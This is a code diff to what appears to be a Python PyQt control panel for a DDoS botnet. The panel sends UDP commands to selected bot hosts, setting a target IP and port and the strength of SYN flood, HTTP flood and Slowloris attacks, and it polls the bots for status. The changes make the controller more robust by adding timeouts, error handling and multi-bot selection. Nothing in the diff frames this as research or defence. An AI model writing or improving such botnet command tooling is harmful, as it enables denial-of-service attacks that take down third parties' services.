@@ -53,6 +53,7 @@ class myApp(QMainWindow, Ui_MainWindow):
             'Missing option!'
         self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self.s.bind(('0.0.0.0', port))
+        self.s.settimeout(5)
         self.label_5.setText(str(self.n_synflood))
         self.label_7.setText(str(self.n_httpflood))
         self.label_9.setText(str(self.n_slowloris))
@@ -95,9 +96,13 @@ class myApp(QMainWindow, Ui_MainWindow):
             self.tgt_port = s[1].strip()
             for ip, port, btn in zip(self.botnet_ip, self.botnet_port, self.btn_botnet_radio):
                 if btn.isChecked():
-                    self.s.sendto(bytes('IP '+str(self.tgt_ip), encoding="utf-8"), (ip, int(port)))
-                    self.s.sendto(bytes('PORT '+str(self.tgt_port), encoding="utf-8"), (ip, int(port)))
-        
+                    try:
+                        self.s.sendto(bytes('IP '+str(self.tgt_ip), encoding="utf-8"), (ip, int(port)))
+                        self.s.sendto(bytes('PORT '+str(self.tgt_port), encoding="utf-8"), (ip, int(port)))
+                    except Exception as e:
+                        print (e)
+                        continue
+                        
     def btn_set_clicked(self):
         
         tmp_min = self.slider_synflood.minimum()
@@ -109,9 +114,9 @@ class myApp(QMainWindow, Ui_MainWindow):
         tmp_min = self.slider_slowloris.minimum()
         tmp_max = self.slider_slowloris.maximum()
         tmp_slow = int(float(self.slider_slowloris.value()-tmp_min)/float(tmp_max-tmp_min)*self.n_slowloris)
-        print (tmp_syn)
-        print (tmp_http)
-        print (tmp_slow)
+        #print (tmp_syn)
+        #print (tmp_http)
+        #print (tmp_slow)
         for ip, port, btn in zip(self.botnet_ip, self.botnet_port, self.btn_botnet_radio):
             if btn.isChecked():
                 try:
@@ -120,7 +125,6 @@ class myApp(QMainWindow, Ui_MainWindow):
                     self.s.sendto(bytes('SLOW '+str(tmp_slow), encoding="utf-8"), (ip, int(port)))
                 except Exception as e:
                     print (e)
-                    print ("not found!")
                     continue
         
     def btn_status_clicked(self):
@@ -137,16 +141,15 @@ class myApp(QMainWindow, Ui_MainWindow):
                 try:
                     self.s.sendto(bytes('STATUS', encoding="utf-8"), (ip, int(port)))
                     resp, addr = self.s.recvfrom(1024)
+                    resp = str(resp, encoding='utf-8').split()
+                    self.tab_status.setItem(i, 0, QTableWidgetItem(str(addr[0])))
+                    self.tab_status.setItem(i, 1, QTableWidgetItem(str(addr[1])))
+                    self.tab_status.setItem(i, 2, QTableWidgetItem(resp[1].strip()))
+                    self.tab_status.setItem(i, 3, QTableWidgetItem(resp[0].strip()))
+                    self.tab_status.setItem(i, 4, QTableWidgetItem(resp[2].strip()))
                 except Exception as e:
                     print (e)
-                    print ("not found!")
                     continue
-                resp = str(resp, encoding='utf-8').split()
-                self.tab_status.setItem(i, 0, QTableWidgetItem(str(addr[0])))
-                self.tab_status.setItem(i, 1, QTableWidgetItem(str(addr[1])))
-                self.tab_status.setItem(i, 2, QTableWidgetItem(resp[1].strip()))
-                self.tab_status.setItem(i, 3, QTableWidgetItem(resp[0].strip()))
-                self.tab_status.setItem(i, 4, QTableWidgetItem(resp[2].strip()))
         
     def btn_botnet_all_clicked(self):
         
@@ -173,7 +176,7 @@ class myApp(QMainWindow, Ui_MainWindow):
             self.tab_botnet.setItem(i, 0, QTableWidgetItem(_ip))
             self.botnet_port.append(str(_port))
             self.tab_botnet.setItem(i, 1, QTableWidgetItem(str(_port)))
-            self.btn_botnet_radio.append(QRadioButton())
+            self.btn_botnet_radio.append(QCheckBox())
             self.tab_botnet.setCellWidget(i, 2, self.btn_botnet_radio[-1])
             self.btn_botnet_radio[-1].setChecked(True)
         self.btn_botnet_all.setEnabled(True)
